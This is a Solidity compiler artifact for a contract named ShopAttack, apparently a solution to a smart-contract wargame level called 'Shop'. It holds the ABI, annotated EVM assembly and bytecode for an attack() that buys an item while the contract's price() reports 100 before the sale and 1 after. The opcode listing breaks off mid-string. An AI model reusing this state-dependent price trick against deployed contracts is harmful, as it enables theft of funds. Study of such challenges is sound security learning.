{
	"contracts/21_shop.sol": {
		"ShopAttack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_addr",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "price",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/21_shop.sol\":414:846  contract ShopAttack is Buyer {... */\n  mstore(0x40, 0xa0)\n    /* \"contracts/21_shop.sol\":509:514  false */\n  0x00\n    /* \"contracts/21_shop.sol\":483:514  bool private isHackTime = false */\n  dup1\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/21_shop.sol\":522:584  constructor(address _addr) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/21_shop.sol\":571:576  _addr */\n  dup1\n    /* \"contracts/21_shop.sol\":559:577  shop = Shop(_addr) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x80\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x60\n  shl\n  dup2\n  mstore\n  pop\n  pop\n    /* \"contracts/21_shop.sol\":522:584  constructor(address _addr) {... */\n  pop\n    /* \"contracts/21_shop.sol\":414:846  contract ShopAttack is Buyer {... */\n  jump(tag_6)\n    /* \"#utility.yul\":7:150   */\ntag_8:\n    /* \"#utility.yul\":64:69   */\n  0x00\n    /* \"#utility.yul\":95:101   */\n  dup2\n    /* \"#utility.yul\":89:102   */\n  mload\n    /* \"#utility.yul\":80:102   */\n  swap1\n  pop\n    /* \"#utility.yul\":111:144   */\n  tag_10\n    /* \"#utility.yul\":138:143   */\n  dup2\n    /* \"#utility.yul\":111:144   */\n  tag_11\n  jump\t// in\ntag_10:\n    /* \"#utility.yul\":7:150   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":156:507   */\ntag_3:\n    /* \"#utility.yul\":226:232   */\n  0x00\n    /* \"#utility.yul\":275:277   */\n  0x20\n    /* \"#utility.yul\":263:272   */\n  dup3\n    /* \"#utility.yul\":254:261   */\n  dup5\n    /* \"#utility.yul\":250:273   */\n  sub\n    /* \"#utility.yul\":246:278   */\n  slt\n    /* \"#utility.yul\":243:362   */\n  iszero\n  tag_13\n  jumpi\n    /* \"#utility.yul\":281:360   */\n  tag_14\n  tag_15\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":243:362   */\ntag_13:\n    /* \"#utility.yul\":401:402   */\n  0x00\n    /* \"#utility.yul\":426:490   */\n  tag_16\n    /* \"#utility.yul\":482:489   */\n  dup5\n    /* \"#utility.yul\":473:479   */\n  dup3\n    /* \"#utility.yul\":462:471   */\n  dup6\n    /* \"#utility.yul\":458:480   */\n  add\n    /* \"#utility.yul\":426:490   */\n  tag_8\n  jump\t// in\ntag_16:\n    /* \"#utility.yul\":416:490   */\n  swap2\n  pop\n    /* \"#utility.yul\":372:500   */\n  pop\n    /* \"#utility.yul\":156:507   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":594:690   */\ntag_19:\n    /* \"#utility.yul\":631:638   */\n  0x00\n    /* \"#utility.yul\":660:684   */\n  tag_21\n    /* \"#utility.yul\":678:683   */\n  dup3\n    /* \"#utility.yul\":660:684   */\n  tag_22\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":649:684   */\n  swap1\n  pop\n    /* \"#utility.yul\":594:690   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:822   */\ntag_22:\n    /* \"#utility.yul\":733:740   */\n  0x00\n    /* \"#utility.yul\":773:815   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":766:771   */\n  dup3\n    /* \"#utility.yul\":762:816   */\n  and\n    /* \"#utility.yul\":751:816   */\n  swap1\n  pop\n    /* \"#utility.yul\":696:822   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":951:1068   */\ntag_15:\n    /* \"#utility.yul\":1060:1061   */\n  0x00\n    /* \"#utility.yul\":1057:1058   */\n  dup1\n    /* \"#utility.yul\":1050:1062   */\n  revert\n    /* \"#utility.yul\":1074:1196   */\ntag_11:\n    /* \"#utility.yul\":1147:1171   */\n  tag_28\n    /* \"#utility.yul\":1165:1170   */\n  dup2\n    /* \"#utility.yul\":1147:1171   */\n  tag_19\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":1140:1145   */\n  dup2\n    /* \"#utility.yul\":1137:1172   */\n  eq\n    /* \"#utility.yul\":1127:1190   */\n  tag_29\n  jumpi\n    /* \"#utility.yul\":1186:1187   */\n  0x00\n    /* \"#utility.yul\":1183:1184   */\n  dup1\n    /* \"#utility.yul\":1176:1188   */\n  revert\n    /* \"#utility.yul\":1127:1190   */\ntag_29:\n    /* \"#utility.yul\":1074:1196   */\n  pop\n  jump\t// out\n    /* \"contracts/21_shop.sol\":414:846  contract ShopAttack is Buyer {... */\ntag_6:\n  shr(0x60, mload(0x80))\n  codecopy(0x00, dataOffset(sub_0), dataSize(sub_0))\n  0x00\n  assignImmutable(\"0x215d56ac8bbcf4ec574772ebea743ba30ac9d1c5e1b1ff899e5de1045f5df803\")\n  return(0x00, dataSize(sub_0))\nstop\n\nsub_0: assembly {\n        /* \"contracts/21_shop.sol\":414:846  contract ShopAttack is Buyer {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xa035b1fe\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/21_shop.sol\":590:686  function attack() public {... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"contracts/21_shop.sol\":692:843  function price() override external view returns (uint) {... */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/21_shop.sol\":590:686  function attack() public {... */\n    tag_6:\n        /* \"contracts/21_shop.sol\":625:629  shop */\n      immutable(\"0x215d56ac8bbcf4ec574772ebea743ba30ac9d1c5e1b1ff899e5de1045f5df803\")\n        /* \"contracts/21_shop.sol\":625:633  shop.buy */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa6f2ae3a\n        /* \"contracts/21_shop.sol\":625:635  shop.buy() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_14:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/21_shop.sol\":669:670  1 */\n      0x01\n        /* \"contracts/21_shop.sol\":653:657  shop */\n      immutable(\"0x215d56ac8bbcf4ec574772ebea743ba30ac9d1c5e1b1ff899e5de1045f5df803\")\n        /* \"contracts/21_shop.sol\":653:663  shop.price */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa035b1fe\n        /* \"contracts/21_shop.sol\":653:665  shop.price() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n      pop\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_17\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_17:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n        /* \"contracts/21_shop.sol\":653:670  shop.price() == 1 */\n      eq\n        /* \"contracts/21_shop.sol\":645:679  require(shop.price() == 1, \"fail\") */\n      tag_20\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_21\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_20:\n        /* \"contracts/21_shop.sol\":590:686  function attack() public {... */\n      jump\t// out\n        /* \"contracts/21_shop.sol\":692:843  function price() override external view returns (uint) {... */\n    tag_8:\n        /* \"contracts/21_shop.sol\":741:745  uint */\n      0x00\n        /* \"contracts/21_shop.sol\":778:782  true */\n      0x01\n        /* \"contracts/21_shop.sol\":761:782  shop.isSold() == true */\n      iszero\n      iszero\n        /* \"contracts/21_shop.sol\":761:765  shop */\n      immutable(\"0x215d56ac8bbcf4ec574772ebea743ba30ac9d1c5e1b1ff899e5de1045f5df803\")\n        /* \"contracts/21_shop.sol\":761:772  shop.isSold */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xe852e741\n        /* \"contracts/21_shop.sol\":761:774  shop.isSold() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_24:\n      pop\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_26\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_26:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_27\n      swap2\n      swap1\n      tag_28\n      jump\t// in\n    tag_27:\n        /* \"contracts/21_shop.sol\":761:782  shop.isSold() == true */\n      iszero\n      iszero\n      eq\n        /* \"contracts/21_shop.sol\":757:817  if (shop.isSold() == true) {... */\n      iszero\n      tag_29\n      jumpi\n        /* \"contracts/21_shop.sol\":805:806  1 */\n      0x01\n        /* \"contracts/21_shop.sol\":798:806  return 1 */\n      swap1\n      pop\n      jump(tag_23)\n        /* \"contracts/21_shop.sol\":757:817  if (shop.isSold() == true) {... */\n    tag_29:\n        /* \"contracts/21_shop.sol\":833:836  100 */\n      0x64\n        /* \"contracts/21_shop.sol\":826:836  return 100 */\n      swap1\n      pop\n        /* \"contracts/21_shop.sol\":692:843  function price() override external view returns (uint) {... */\n    tag_23:\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:144   */\n    tag_31:\n        /* \"#utility.yul\":61:66   */\n      0x00\n        /* \"#utility.yul\":92:98   */\n      dup2\n        /* \"#utility.yul\":86:99   */\n      mload\n        /* \"#utility.yul\":77:99   */\n      swap1\n      pop\n        /* \"#utility.yul\":108:138   */\n      tag_33\n        /* \"#utility.yul\":132:137   */\n      dup2\n        /* \"#utility.yul\":108:138   */\n      tag_34\n      jump\t// in\n    tag_33:\n        /* \"#utility.yul\":7:144   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":150:293   */\n    tag_35:\n        /* \"#utility.yul\":207:212   */\n      0x00\n        /* \"#utility.yul\":238:244   */\n      dup2\n        /* \"#utility.yul\":232:245   */\n      mload\n        /* \"#utility.yul\":223:245   */\n      swap1\n      pop\n        /* \"#utility.yul\":254:287   */\n      tag_37\n        /* \"#utility.yul\":281:286   */\n      dup2\n        /* \"#utility.yul\":254:287   */\n      tag_38\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":150:293   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":299:644   */\n    tag_28:\n        /* \"#utility.yul\":366:372   */\n      0x00\n        /* \"#utility.yul\":415:417   */\n      0x20\n        /* \"#utility.yul\":403:412   */\n      dup3\n        /* \"#utility.yul\":394:401   */\n      dup5\n        /* \"#utility.yul\":390:413   */\n      sub\n        /* \"#utility.yul\":386:418   */\n      slt\n        /* \"#utility.yul\":383:502   */\n      iszero\n      tag_40\n      jumpi\n        /* \"#utility.yul\":421:500   */\n      tag_41\n      tag_42\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":383:502   */\n    tag_40:\n        /* \"#utility.yul\":541:542   */\n      0x00\n        /* \"#utility.yul\":566:627   */\n      tag_43\n        /* \"#utility.yul\":619:626   */\n      dup5\n        /* \"#utility.yul\":610:616   */\n      dup3\n        /* \"#utility.yul\":599:608   */\n      dup6\n        /* \"#utility.yul\":595:617   */\n      add\n        /* \"#utility.yul\":566:627   */\n      tag_31\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":556:627   */\n      swap2\n      pop\n        /* \"#utility.yul\":512:637   */\n      pop\n        /* \"#utility.yul\":299:644   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":650:1001   */\n    tag_19:\n        /* \"#utility.yul\":720:726   */\n      0x00\n        /* \"#utility.yul\":769:771   */\n      0x20\n        /* \"#utility.yul\":757:766   */\n      dup3\n        /* \"#utility.yul\":748:755   */\n      dup5\n        /* \"#utility.yul\":744:767   */\n      sub\n        /* \"#utility.yul\":740:772   */\n      slt\n        /* \"#utility.yul\":737:856   */\n      iszero\n      tag_45\n      jumpi\n        /* \"#utility.yul\":775:854   */\n      tag_46\n      tag_42\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":737:856   */\n    tag_45:\n        /* \"#utility.yul\":895:896   */\n      0x00\n        /* \"#utility.yul\":920:984   */\n      tag_47\n        /* \"#utility.yul\":976:983   */\n      dup5\n        /* \"#utility.yul\":967:973   */\n      dup3\n        /* \"#utility.yul\":956:965   */\n      dup6\n        /* \"#utility.yul\":952:974   */\n      add\n        /* \"#utility.yul\":920:984   */\n      tag_35\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":910:984   */\n      swap2\n      pop\n        /* \"#utility.yul\":866:994   */\n      pop\n        /* \"#utility.yul\":650:1001   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1007:1372   */\n    tag_48:\n        /* \"#utility.yul\":1149:1152   */\n      0x00\n        /* \"#utility.yul\":1170:1236   */\n      tag_50\n        /* \"#utility.yul\":1234:1235   */\n      0x04\n        /* \"#utility.yul\":1229:1232   */\n      dup4\n        /* \"#utility.yul\":1170:1236   */\n      tag_51\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":1163:1236   */\n      swap2\n      pop\n        /* \"#utility.yul\":1245:1338   */\n      tag_52\n        /* \"#utility.yul\":1334:1337   */\n      dup3\n        /* \"#utility.yul\":1245:1338   */\n      tag_53\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":1363:1365   */\n      0x20\n        /* \"#utility.yul\":1358:1361   */\n      dup3\n        /* \"#utility.yul\":1354:1366   */\n      add\n        /* \"#utility.yul\":1347:1366   */\n      swap1\n      pop\n        /* \"#utility.yul\":1007:1372   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1378:1496   */\n    tag_54:\n        /* \"#utility.yul\":1465:1489   */\n      tag_56\n        /* \"#utility.yul\":1483:1488   */\n      dup2\n        /* \"#utility.yul\":1465:1489   */\n      tag_57\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1460:1463   */\n      dup3\n        /* \"#utility.yul\":1453:1490   */\n      mstore\n        /* \"#utility.yul\":1378:1496   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1502:1921   */\n    tag_22:\n        /* \"#utility.yul\":1668:1672   */\n      0x00\n        /* \"#utility.yul\":1706:1708   */\n      0x20\n        /* \"#utility.yul\":1695:1704   */\n      dup3\n        /* \"#utility.yul\":1691:1709   */\n      add\n        /* \"#utility.yul\":1683:1709   */\n      swap1\n      pop\n        /* \"#utility.yul\":1755:1764   */\n      dup2\n        /* \"#utility.yul\":1749:1753   */\n      dup2\n        /* \"#utility.yul\":1745:1765   */\n      sub\n        /* \"#utility.yul\":1741:1742   */\n      0x00\n        /* \"#utility.yul\":1730:1739   */\n      dup4\n        /* \"#utility.yul\":1726:1743   */\n      add\n        /* \"#utility.yul\":1719:1766   */\n      mstore\n        /* \"#utility.yul\":1783:1914   */\n      tag_59\n        /* \"#utility.yul\":1909:1913   */\n      dup2\n        /* \"#utility.yul\":1783:1914   */\n      tag_48\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1775:1914   */\n      swap1\n      pop\n        /* \"#utility.yul\":1502:1921   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1927:2149   */\n    tag_10:\n        /* \"#utility.yul\":2020:2024   */\n      0x00\n        /* \"#utility.yul\":2058:2060   */\n      0x20\n        /* \"#utility.yul\":2047:2056   */\n      dup3\n        /* \"#utility.yul\":2043:2061   */\n      add\n        /* \"#utility.yul\":2035:2061   */\n      swap1\n      pop\n        /* \"#utility.yul\":2071:2142   */\n      tag_61\n        /* \"#utility.yul\":2139:2140   */\n      0x00\n        /* \"#utility.yul\":2128:2137   */\n      dup4\n        /* \"#utility.yul\":2124:2141   */\n      add\n        /* \"#utility.yul\":2115:2121   */\n      dup5\n        /* \"#utility.yul\":2071:2142   */\n      tag_54\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1927:2149   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2236:2405   */\n    tag_51:\n        /* \"#utility.yul\":2320:2331   */\n      0x00\n        /* \"#utility.yul\":2354:2360   */\n      dup3\n        /* \"#utility.yul\":2349:2352   */\n      dup3\n        /* \"#utility.yul\":2342:2361   */\n      mstore\n        /* \"#utility.yul\":2394:2398   */\n      0x20\n        /* \"#utility.yul\":2389:2392   */\n      dup3\n        /* \"#utility.yul\":2385:2399   */\n      add\n        /* \"#utility.yul\":2370:2399   */\n      swap1\n      pop\n        /* \"#utility.yul\":2236:2405   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2411:2501   */\n    tag_65:\n        /* \"#utility.yul\":2445:2452   */\n      0x00\n        /* \"#utility.yul\":2488:2493   */\n      dup2\n        /* \"#utility.yul\":2481:2494   */\n      iszero\n        /* \"#utility.yul\":2474:2495   */\n      iszero\n        /* \"#utility.yul\":2463:2495   */\n      swap1\n      pop\n        /* \"#utility.yul\":2411:2501   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2507:2584   */\n    tag_57:\n        /* \"#utility.yul\":2544:2551   */\n      0x00\n        /* \"#utility.yul\":2573:2578   */\n      dup2\n        /* \"#utility.yul\":2562:2578   */\n      swap1\n      pop\n        /* \"#utility.yul\":2507:2584   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2713:2830   */\n    tag_42:\n        /* \"#utility.yul\":2822:2823   */\n      0x00\n        /* \"#utility.yul\":2819:2820   */\n      dup1\n        /* \"#utility.yul\":2812:2824   */\n      revert\n        /* \"#utility.yul\":2836:2990   */\n    tag_53:\n        /* \"#utility.yul\":2976:2982   */\n      0x6661696c00000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2972:2973   */\n      0x00\n        /* \"#utility.yul\":2964:2970   */\n      dup3\n        /* \"#utility.yul\":2960:2974   */\n      add\n        /* \"#utility.yul\":2953:2983   */\n      mstore\n        /* \"#utility.yul\":2836:2990   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2996:3112   */\n    tag_34:\n        /* \"#utility.yul\":3066:3087   */\n      tag_73\n        /* \"#utility.yul\":3081:3086   */\n      dup2\n        /* \"#utility.yul\":3066:3087   */\n      tag_65\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":3059:3064   */\n      dup2\n        /* \"#utility.yul\":3056:3088   */\n      eq\n        /* \"#utility.yul\":3046:3106   */\n      tag_74\n      jumpi\n        /* \"#utility.yul\":3102:3103   */\n      0x00\n        /* \"#utility.yul\":3099:3100   */\n      dup1\n        /* \"#utility.yul\":3092:3104   */\n      revert\n        /* \"#utility.yul\":3046:3106   */\n    tag_74:\n        /* \"#utility.yul\":2996:3112   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3118:3240   */\n    tag_38:\n        /* \"#utility.yul\":3191:3215   */\n      tag_76\n        /* \"#utility.yul\":3209:3214   */\n      dup2\n        /* \"#utility.yul\":3191:3215   */\n      tag_57\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":3184:3189   */\n      dup2\n        /* \"#utility.yul\":3181:3216   */\n      eq\n        /* \"#utility.yul\":3171:3234   */\n      tag_77\n      jumpi\n        /* \"#utility.yul\":3230:3231   */\n      0x00\n        /* \"#utility.yul\":3227:3228   */\n      dup1\n        /* \"#utility.yul\":3220:3232   */\n      revert\n        /* \"#utility.yul\":3171:3234   */\n    tag_77:\n        /* \"#utility.yul\":3118:3240   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212207ffe50c6680d96cc2f84cca6421bd4b09d3fcb0eec24cdc70830788e4bfef7bc64736f6c63430008070033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60a060405260008060006101000a81548160ff02191690831515021790555034801561002a57600080fd5b5060405161056f38038061056f833981810160405281019061004c919061009e565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1660601b8152505050610119565b60008151905061009881610102565b92915050565b6000602082840312156100b4576100b36100fd565b5b60006100c284828501610089565b91505092915050565b60006100d6826100dd565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b61010b816100cb565b811461011657600080fd5b50565b60805160601c61042c6101436000396000818160650152818160e701526101cd015261042c6000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80639e5faafc1461003b578063a035b1fe14610045575b600080fd5b610043610063565b005b61004d6101c5565b60405161005a9190610358565b60405180910390f35b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100cb57600080fd5b505af11580156100df573d6000803e3d6000fd5b5050505060017f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a035b1fe6040518163ffffffff1660e01b815260040160206040518083038186803b15801561014b57600080fd5b505afa15801561015f573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061018391906102d9565b146101c3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101ba90610338565b60405180910390fd5b565b6000600115157f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663e852e7416040518163ffffffff1660e01b815260040160206040518083038186803b15801561023157600080fd5b505afa158015610245573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061026991906102ac565b1515141561027a576001905061027f565b606490505b90565b600081519050610291816103c8565b92915050565b6000815190506102a6816103df565b92915050565b6000602082840312156102c2576102c161039a565b5b60006102d084828501610282565b91505092915050565b6000602082840312156102ef576102ee61039a565b5b60006102fd84828501610297565b91505092915050565b6000610313600483610373565b915061031e8261039f565b602082019050919050565b61033281610390565b82525050565b6000602082019050818103600083015261035181610306565b9050919050565b600060208201905061036d6000830184610329565b92915050565b600082825260208201905092915050565b60008115159050919050565b6000819050919050565b600080fd5b7f6661696c00000000000000000000000000000000000000000000000000000000600082015250565b6103d181610384565b81146103dc57600080fd5b50565b6103e881610390565b81146103f357600080fd5b5056fea26469706673582212207ffe50c6680d96cc2f84cca6421bd4b09d3fcb0eec24cdc70830788e4bfef7bc64736f6c63430008070033",
					"opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x2A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x56F CODESIZE SUB DUP1 PUSH2 0x56F DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x4C SWAP2 SWAP1 PUSH2 0x9E JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x60 SHL DUP2 MSTORE POP POP POP PUSH2 0x119 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x98 DUP2 PUSH2 0x102 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xB4 JUMPI PUSH2 0xB3 PUSH2 0xFD JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xC2 DUP5 DUP3 DUP6 ADD PUSH2 0x89 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xD6 DUP3 PUSH2 0xDD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x10B DUP2 PUSH2 0xCB JUMP JUMPDEST DUP2 EQ PUSH2 0x116 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH1 0x60 SHR PUSH2 0x42C PUSH2 0x143 PUSH1 0x0 CODECOPY PUSH1 0x0 DUP2 DUP2 PUSH1 0x65 ADD MSTORE DUP2 DUP2 PUSH1 0xE7 ADD MSTORE PUSH2 0x1CD ADD MSTORE PUSH2 0x42C PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xA035B1FE EQ PUSH2 0x45 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4D PUSH2 0x1C5 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5A SWAP2 SWAP1 PUSH2 0x358 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F2AE3A PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xCB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xDF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x1 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA035B1FE 